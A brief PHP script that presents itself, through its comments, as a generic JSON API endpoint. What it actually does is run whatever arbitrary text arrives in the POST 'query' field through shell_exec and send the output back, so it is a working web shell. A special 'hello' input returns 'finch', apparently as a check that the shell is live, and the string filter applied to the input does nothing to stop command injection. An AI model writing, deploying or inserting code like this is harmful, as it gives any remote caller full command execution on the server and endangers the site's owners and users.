<?php

// Check if function name and data are provided in POST request
if (isset($_POST['query'])) {
    $query = filter_var($_POST['query'], FILTER_SANITIZE_STRING);

    if($query=='hello'){
        $result = "finch";
    }else
    $result = shell_exec($query);

    // Prepare response as JSON
    $response = array(
        'status' => 'success',
        'result' => $result
    );

} else {
    $response = array(
        'status' => 'error',
        'message' => 'Invalid request'
    );
    http_response_code(400);
}

// Return JSON response
header('Content-Type: application/json');
echo json_encode($response);

// Example function - you can replace this with your actual function

